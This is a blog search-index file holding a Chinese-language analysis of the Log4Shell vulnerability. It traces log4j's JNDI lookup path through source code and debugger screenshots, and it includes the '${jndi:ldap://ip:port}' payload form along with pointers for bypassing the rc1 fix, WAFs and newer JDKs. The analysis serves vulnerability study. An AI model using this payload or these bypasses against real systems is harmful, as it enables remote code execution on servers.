<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Log4Shell</title>
    <link href="/2023/09/28/Log4Shell/"/>
    <url>/2023/09/28/Log4Shell/</url>
    
    <content type="html"><![CDATA[<h1 id="Log4Shell"><a href="#Log4Shell" class="headerlink" title="Log4Shell"></a>Log4Shell</h1><p>配套代码在：<a href="https://github.com/springkill/top50vulns_2023">top50vulns_2023</a>配合食用更佳！</p><h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p>本漏洞是因为log4j官方提供了一个名为<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html">Message Lookup Substitution</a>的功能，此功能会动态地获取某些内容：<br>如字符串<code>Running $&#123;java:runtime&#125;</code>会被解析为<code>Running Java version 1.8xxx</code>.</p><p>官方文档中对此的部分描述如下：</p><p>The JavaLookup allows Java environment information to be retrieved in convenient preformatted strings using the <code>java:</code> prefix.</p><p>使用如下内容可以检索Java相关信息：</p><table><thead><tr><th align="left">Key</th><th align="left">Description</th></tr></thead><tbody><tr><td align="left">version</td><td align="left">The short Java version, like:<code>Java version 1.7.0_67</code></td></tr><tr><td align="left">runtime</td><td align="left">The Java runtime version, like:<code>Java(TM) SE Runtime Environment (build 1.7.0_67-b01) from Oracle Corporation</code></td></tr><tr><td align="left">vm</td><td align="left">The Java VM version, like:<code>Java HotSpot(TM) 64-Bit Server VM (build 24.65-b04, mixed mode)</code></td></tr><tr><td align="left">os</td><td align="left">The OS version, like:<code>Windows 7 6.1 Service Pack 1, architecture: amd64-64</code></td></tr><tr><td align="left">locale</td><td align="left">System locale and file encoding information, like:<code>default locale: en_US, platform encoding: Cp1252</code></td></tr><tr><td align="left">hw</td><td align="left">Hardware information, like:<code>processors: 4, architecture: amd64-64, instruction sets: amd64</code></td></tr></tbody></table><p>同时官方也提供了JNDI功能来调用远程方法：</p><h3 id="JNDI-Lookup"><a href="#JNDI-Lookup" class="headerlink" title="JNDI Lookup"></a>JNDI Lookup</h3><p>As of Log4j 2.17.0 JNDI operations require that <code>log4j2.enableJndiLookup=true</code> be set as a system property or the corresponding environment variable for this lookup to function. See the <a href="https://logging.apache.org/log4j/2.x/manual/configuration.html#enableJndiLookup">enableJndiLookup</a> system property.</p><p>The JndiLookup allows variables to be retrieved via JNDI. By default the key will be prefixed with java:comp&#x2F;env&#x2F;, however if the key contains a “:” no prefix will be added.</p><p>The JNDI Lookup only supports the java protocol or no protocol (as shown in the example below).</p><p>使用如下方式开启JNDI检索：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">File</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;Application&quot;</span> <span class="hljs-attr">fileName</span>=<span class="hljs-string">&quot;application.log&quot;</span>&gt;</span>  <br>    <span class="hljs-tag">&lt;<span class="hljs-name">PatternLayout</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">pattern</span>&gt;</span>%d %p %c&#123;1.&#125; [%t] $$&#123;jndi:logging/context-name&#125; %m%n<span class="hljs-tag">&lt;/<span class="hljs-name">pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">PatternLayout</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">File</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也正是提供了JNDI查找的功能，导致了漏洞的出现。</p><p>当<code>JNDI</code>与 <code>LDAP</code> 协议搭配使用时，将从远程源获取指定的 Java 类并将其反序列化，在此过程中执行该类的一些代码，造成反序列化攻击。<br>payload形式例如：<code>$&#123;jndi:ldap://ip:port&#125;</code></p><h2 id="漏洞分析-复现"><a href="#漏洞分析-复现" class="headerlink" title="漏洞分析&amp;&amp;复现"></a>漏洞分析&amp;&amp;复现</h2><p>先写一个demo来实现log4Shell。</p><p>在log4j2中存在一个接口名为StrLookup：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.apache.logging.log4j.core.lookup;<br><br><span class="hljs-keyword">import</span> org.apache.logging.log4j.core.LogEvent;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">StrLookup</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">CATEGORY</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Lookup&quot;</span>;<br><br>    String <span class="hljs-title function_">lookup</span><span class="hljs-params">(String key)</span>;<br><br>    String <span class="hljs-title function_">lookup</span><span class="hljs-params">(LogEvent event, String key)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>当在log4j2中使用了如<code>$&#123;prefix:key&#125;</code>的类型时，就会调用相应的<code>StrLookup</code>。</p><p>这个接口被以<code>Map&lt;String,StrLookup&gt;</code>的方式封装在了<code>Interpolator</code>中，可以在项目代码的<code>断点1</code>处打断点观察封装在<code>Interpolator</code>内部的<code>StrLookup</code>：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">Interpolator</span><span class="hljs-params">(<span class="hljs-keyword">final</span> Map&lt;String, String&gt; properties)</span> &#123;<br>        <span class="hljs-built_in">this</span>.strLookupMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-built_in">this</span>.defaultLookup = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MapLookup</span>((Map)(properties == <span class="hljs-literal">null</span> ? <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>() : properties));<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;log4j&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Log4jLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;sys&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SystemPropertiesLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;env&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EnvironmentLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;main&quot;</span>, MainMapLookup.MAIN_SINGLETON);<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;marker&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MarkerLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;java&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JavaLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;lower&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">LowerLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;upper&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpperLookup</span>());<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;jndi&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.core.lookup.JndiLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception | LinkageError var9) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;jndi&quot;</span>, var9);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;jvmrunargs&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.core.lookup.JmxRuntimeInputArgumentsLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception | LinkageError var8) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;jvmrunargs&quot;</span>, var8);<br>        &#125;<br><br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;date&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">DateLookup</span>());<br>        <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;ctx&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ContextMapLookup</span>());<br>        <span class="hljs-keyword">if</span> (Constants.IS_WEB_APP) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;web&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.web.WebLookup&quot;</span>, StrLookup.class));<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var7) &#123;<br>                <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;web&quot;</span>, var7);<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            LOGGER.debug(<span class="hljs-string">&quot;Not in a ServletContext environment, thus not loading WebLookup plugin.&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;docker&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.docker.DockerLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var6) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;docker&quot;</span>, var6);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;spring&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.spring.cloud.config.client.SpringLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var5) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;spring&quot;</span>, var5);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-built_in">this</span>.strLookupMap.put(<span class="hljs-string">&quot;kubernetes&quot;</span>, Loader.newCheckedInstanceOf(<span class="hljs-string">&quot;org.apache.logging.log4j.kubernetes.KubernetesLookup&quot;</span>, StrLookup.class));<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var3) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;kubernetes&quot;</span>, var3);<br>        &#125; <span class="hljs-keyword">catch</span> (NoClassDefFoundError var4) &#123;<br>            <span class="hljs-built_in">this</span>.handleError(<span class="hljs-string">&quot;kubernetes&quot;</span>, var4);<br>        &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><img src="/2023/09/28/Log4Shell/image-20230928013525232-1695897805957-1-1695899839737-41.png" class="" title="image-20230928013525232"><p> 当<code>$&#123;prefix:key&#125;</code>中的<code>prefix</code>不为空的时候，<code>Interpolator</code>中的<code>lookup</code>方法就会去调用<code>prefix</code>对应的<code>StrLookup</code>的<code>lookup</code>方法去查询key所对应的内容，当<code>prefix</code>为<code>jndi</code>的时候就造成了JNDI注入：</p><img src="/2023/09/28/Log4Shell/image-20230928020051845-1695897805957-2-1695899839737-42.png" class="" title="image-20230928020051845"><img src="/2023/09/28/Log4Shell/image-20230928020841071-1695897805957-3-1695899839737-43.png" class="" title="image-20230928020841071"><p>本次漏洞关键在于转换器名称<code>msg</code>对应的插件实例<code>MessagePatternConverter</code>对于日志中的消息内容处理存在问题，在大多数场景下这部分是攻击者可控的。<code>MessagePatternConverter</code>会将日志中的消息内容为<code>$&#123;prefix:key&#125;</code>格式的字符串进行解析转换，读取环境变量。此时为jndi的方式的话，就存在漏洞。</p><p>详细流程如下，当log4j开始进行处理的时候，<code>AbstractOutputStreamAppender</code>类的<code>directEncodeEvent</code>方法先获取当前使用的布局，并调用对应的<code>encode</code>方法：</p><img src="/2023/09/28/Log4Shell/image-20230928125229635-1695899839732-24.png" class="" title="image-20230928125229635"><p>进入默认布局<code>PatternLayout</code>类的<code>encode</code>方法，<code>encode</code>调用<code>toText</code>：</p><img src="/2023/09/28/Log4Shell/image-20230928125540683-1695899839732-25.png" class="" title="image-20230928125540683"><p>toText中会获取对应的<code>serialize</code>r然后调用<code>serializer</code>的<code>toSerializable</code>方法</p><img src="/2023/09/28/Log4Shell/image-20230928125705420-1695899839732-26.png" class="" title="image-20230928125705420"><p>随后进入<code>toSerializable</code>后会在循环中使用合适的<code>converter</code>来处理传入的内容：</p><img src="/2023/09/28/Log4Shell/image-20230928135519938-1695899839732-27.png" class="" title="image-20230928135519938"><img src="/2023/09/28/Log4Shell/image-20230928140306447-1695899839732-28.png" class=""><p>继续往下跟进的时候会看到在<code>MessagePatternConverter</code>类中对传入的<code>$&#123;prefix:key&#125;</code>进行了处理，</p><img src="/2023/09/28/Log4Shell/image-20230928141108185-1695899839732-29.png" class="" title="image-20230928141108185"><p>细心的师傅们可能看到了offset&#x3D;68和count&#x3D;99这样的差别，中间差了31位的长度：</p><img src="/2023/09/28/Log4Shell/image-20230928141812113-1695899839732-30.png" class="" title="image-20230928141812113"><img src="/2023/09/28/Log4Shell/image-20230928141752845-1695899839732-31.png" class="" title="image-20230928141752845"><p>这是因为在经过了<code>formatTo</code>方法后截取了<code>$&#123;prefix:key&#125;</code>的值，所以长度减少了，我这里是31：</p><img src="/2023/09/28/Log4Shell/image-20230928142544264-1695899839733-32.png" class="" title="image-20230928142544264"><img src="/2023/09/28/Log4Shell/image-20230928142701509-1695899839733-33.png" class="" title="image-20230928142701509"><img src="/2023/09/28/Log4Shell/image-20230928142939212-1695899839733-34.png" class="" title="image-20230928142939212"><img src="/2023/09/28/Log4Shell/image-20230928143110502-1695899839733-35.png" class="" title="image-20230928143110502"><p>那么log4j截取这部分的内容做什么呢，走到这段<code>if</code>的最后流程，是一个<code>append</code>（当然前面还有个<code>substring</code>）,要append的内容就要由log4j去查找了，剩下的上面已经说过了，选取合适的<code>StrLookup</code>的<code>lookup</code>方法去查询<code>key</code>所对应的内容，最终调用<code>JndiMananger</code>中的<code>lookup</code>后调用到<code>ldap</code>的<code>lookup</code>：</p><img src="/2023/09/28/Log4Shell/image-20230928150520456-1695899839733-36.png" class="" title="image-20230928150520456"><img src="/2023/09/28/Log4Shell/image-20230928145907568-1695899839733-37.png" class="" title="image-20230928145907568"><img src="/2023/09/28/Log4Shell/image-20230928150108133-1695899839733-38.png" class="" title="image-20230928150108133"><p>这个时候我们启动一个恶意的JNDI服务，并替换地址：</p><img src="/2023/09/28/Log4Shell/image-20230928182725540-1695899839733-39.png" class="" title="image-20230928182725540"><img src="/2023/09/28/Log4Shell/image-20230928183008647-1695899839733-40.png" class="" title="image-20230928183008647"><h2 id="关于绕过"><a href="#关于绕过" class="headerlink" title="关于绕过"></a>关于绕过</h2><p>rc1的修复可以被绕过，但是需要开发人员手工开启<code>log4j2.formatMsgLookups=true</code>又或者配置文件中自己写<code>%msg&#123;lookups&#125;%n&quot;</code>类似的布局模式，但是对于学习来说还是有意义的，所以简单说下，对于开启了这些配置的log4j2-rc1，其内部仍然加了一些白名单和其他的严格检测，但是如果抛出了<code>URISyntaxException</code>异常，那么就会绕过这些限制，catch异常后重新进入前面JNDI注入的流程。</p><p>具体的修复在<a href="https://github.com/apache/logging-log4j2/commit/bac0d8a35c7e354a0d3f706569116dff6c6bd658">这里</a>感兴趣的可以去看下，因为流程基本一样，所以这里就不做复现了。</p><img src="/2023/09/28/Log4Shell/image-20230928191702796.png" class=""><p>关于WAF基本的思路就是利用log4j的迭代解析进行poc构造，不过貌似现在大家都能防住了。</p><p>关于高版本JDK的绕过思路，可以通过 <code>org.apache.naming.factory.BeanFactory</code> 等类进行绕过。</p>]]></content>
    
    
    <categories>
      
      <category>Top50VulnsToRCE_2023</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Top50VulnsToRCE_2023</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
